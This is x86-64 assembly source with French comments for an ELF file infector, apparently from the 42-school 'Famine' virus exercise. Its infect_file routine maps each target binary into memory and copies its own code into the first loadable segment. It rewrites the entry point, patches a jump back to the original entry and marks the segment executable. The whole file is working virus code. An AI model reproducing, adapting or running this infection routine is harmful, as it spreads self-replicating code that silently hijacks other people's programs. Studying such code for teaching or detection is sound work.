; void  infect_file(char *filename, t_famine, *famine);
infect_file:
    mov r12, rsi
    mov rsi, O_RDWR
    mov rax, SYS_OPEN
    syscall              ; open(filemane, O_RDWR)
    cmp rax, 0           ; if (fd < 0) return ;
    jl bad_fd
    mov [r12 + fd], rax
get_file_data:
    mov rdi, [r12 + fd]
    xor rsi, rsi
    mov rdx, SEEK_END
    mov rax, SYS_LSEEK
    syscall             ; lseek(fd, 0, SEEK_END)
    mov [r12 + fileSize], rax
    cmp rax, 0          ; if (size < 0) return ;
    jl close_file
    cmp rax, SIGNATURE_SIZE          ; if (size > SIGNATURE_SIZE) continue ;
    jge file_size_ok
    mov rdi, [r12 + fileName]
    call append_signature
    jmp close_file
    file_size_ok:                                                                                               ;faire un check si le fichier est pas assez grand et le passer dans la fonction append_signature
    
    xor rdi, rdi
    mov rsi, [r12 + fileSize]
    mov rdx, PROT_READ | PROT_WRITE
    mov r10, MAP_SHARED ; r10 est le 4 ieme argument car rcx et r11 sont détruit par le kernel
    mov r8, [r12 + fd]
    xor r9, r9
    mov rax, SYS_MMAP
    syscall             ; mmap(0, fileSize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)
    cmp rax, 0          ; if (!fileData) return ;
    jz  close_file
    mov [r12 + fileData], rax   ; faire des check pour le format

check_signature:
    xor rdx, rdx
    mov rcx, [r12 + fileSize]
    sub rcx, SIGNATURE_SIZE
    lea rdi, [rel signature] 
    jmp check_signature_cmp
    check_signature_loop:
        mov rsi, [r12 + fileData]
        add rsi, rdx  
        call ft_strcmp
        cmp rax, 0
        jz close_mmap
        inc rdx
        
    check_signature_cmp:
    cmp rdx, rcx
    jl check_signature_loop
    
check_file_integrity:
    mov rdi, [r12 + fileData]
    cmp dword [rdi], 1179403647 ; magic number 0x7f454c46 464c457f
	jnz simple
	mov sil, [rdi + s_support]
	cmp sil, 1			; cmp 32 bit
	je simple
	bit_64:
    jmp get_file_entry

	simple: 
    mov rdi, [r12 + fileName]
    call append_signature
    jmp close_mmap




get_file_entry:
    mov rax, [r12 + fileData]
    mov rdi, [rax + e_entry]
    mov [r12 + oldEntry], rdi
    

get_first_pload:
    mov r13, [r12 + fileData]     ; r13 = famine->filedata;
    xor r14, r14                  ; mise a 0
    xor rdi, rdi
    mov di, [r13 + e_phnum]
    mov rsi, [r13 + e_phoff]
    xor rdx, rdx
    mov dx, [r13 + e_phentsize]
    xor rax, rax
phead_loop:
    mov eax, [r13 + rsi + p_type]
    cmp rax, PT_LOAD
    jz first_pload_found
    inc r14
    add rsi, rdx
    cmp r14, rdi
    jl phead_loop
    jmp close_mmap                    ;on quite si il n'y a pas de pload trouvé
first_pload_found:                                                                                              ; faire un check pour voir si on a la place d'écrire 
    add r13, rsi
    mov [r12 + pload], r13
    mov rdi, [r13 + p_vaddr]             ; met l'entry a la fin du premier pload = p_vaddr + p_memsz
    add rdi, [r13 + p_memsz]
    mov [r12 + entry], rdi
    mov rsi, [r12 + fileData]           ; écrit la nouvelle entry dans l'executable
    mov [rsi + e_entry], rdi
copy_program:
    mov rdi, [r12 + fileData]               ; address a la fin du premier pload
    add rdi, [r13 + p_filesz]
    lea rsi, [rel main]                     ; address du debut du programe
    mov rdx, PROG_SIZE                      ; taille du programe
    call ft_memcpy
    
    ; calcule le jump qu'il faut faire pour attendre l'entry normale 
    mov rdx, [r12 + entry]
    add rdx, JMP_OFFSET + 5
    mov rcx, [r12 + oldEntry]
    sub ecx, edx
    
    ; ecrit le jump a l'adress de jump
    mov [rdi + JMP_OFFSET], byte 0xE9 ; 0xe9 = jmp
    mov [rdi + JMP_OFFSET + 1], ecx

    ; augmente la taille du premier pload
    add qword [r13 + p_memsz], PROG_SIZE
    add qword [r13 + p_filesz], PROG_SIZE
    
    or dword [r13 + p_flags], PF_X           ; ajoute les droit d'execution
    
close_mmap:
    mov rdi, [r12 + fileData]
    mov rsi, [r12 + fileSize]
    mov rax, SYS_MUNMAP 
    syscall             ; munmap(fileData, fileSize)

close_file:
    mov rdi, [r12 + fd]
    mov rax, SYS_CLOSE  
    syscall             ; close(fd)
bad_fd:
    ret